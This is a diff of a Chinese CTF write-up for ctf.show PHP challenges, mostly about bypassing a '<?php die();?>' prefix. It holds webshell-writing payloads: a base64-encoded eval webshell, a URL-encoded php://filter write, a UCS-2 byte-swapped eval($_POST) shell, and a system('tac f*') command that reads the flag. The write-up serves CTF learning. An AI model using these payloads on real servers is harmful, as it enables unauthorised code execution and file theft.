@@ -286,7 +286,7 @@ if(isset($_GET['file'])){
 } 
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 这道题帮我加深了我的绕过，我甚至之前都没彻底理解了getshell，现在我才理解到这个真正的含义。
 
@@ -308,7 +308,7 @@ content=abPD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==
 http://1bd6bcd0-f840-4cc2-9665-0601cbe23a6d.challenge.ctf.show/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30
 ```
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 然后我们就会看到一片空白，这说明我们的文件已经上传上去了，getshell。yes。
 
@@ -402,17 +402,37 @@ file_put_contents($file, "<?php die();?>".$contents);
 
 <figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
 
-需要死亡绕过，然后base64和rot13都被ban了。所以只能寻找其他的过滤方式。补充死亡绕过的过滤方式了，jrm谁懂啊
+需要死亡绕过，然后base64和rot13都被ban了。所以只能寻找其他的过滤方式。补充死亡绕过的过滤方式了，jrm谁懂啊。这里用了刚刚学的ucs-2，然后我们看到其实除了这个他也没啥其他的陷阱，其余按照之前的思路写，就是过滤器形式啥的变了一下。
 
+GET:
 
+```php
+http://c8302562-9e80-45b9-8120-88c1b16d2137.challenge.ctf.show/?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
+```
 
+POST:
 
+```url
+contents=?<hp pvela$(P_SO[T]1;)>?
+```
 
+写入成功了，但是这个没有回显，没关系，我们直接去看目录下的这个文件，然后传入查看文件的指令
 
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
+GET:
 
+```url
+http://c8302562-9e80-45b9-8120-88c1b16d2137.challenge.ctf.show/a.php
+```
 
+POST:
 
+```url
+1=system('tac f*');
+```
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
